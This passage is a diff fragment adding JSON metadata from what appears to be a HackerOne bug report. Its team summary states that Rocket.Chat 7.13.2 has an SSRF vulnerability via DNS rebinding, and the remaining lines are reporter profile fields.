+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 881781,
+      "category": "team",
+      "content": "Rocket.Chat version 7.13.2 contains an SSRF vulnerability caused by a DNS rebinding attack, which allows access to internal hosts and reading of their responses.",
+      "updated_at": "2026-07-29T01:48:33.559Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 3263671,
+        "username": "julio_araujo",
+        "name": "Julio Araujo",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2024-06-13T19:54:10.262Z",
+        "url": "https://hackerone.com/julio_araujo",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/cg53v3fktla093w2xpx7kafrww48/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/cg53v3fktla093w2xpx7kafrww48/8f5393bb06e000811ac3ac31f77f5ce1d049785766c3d25a25cec97adaa9cc12",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/cg53v3fktla093w2xpx7kafrww48/eab7e558a2bc3ec841c51b96524419e712978d371ddb665048a3154ab05197fc"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
